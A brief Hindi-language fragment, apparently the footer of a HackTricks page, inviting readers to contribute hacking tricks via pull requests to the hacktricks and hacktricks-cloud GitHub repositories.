* **अपने हैकिंग ट्रिक्स को हमें PR के माध्यम से साझा करें** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **और** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **को सबमिट करके।**

</details>
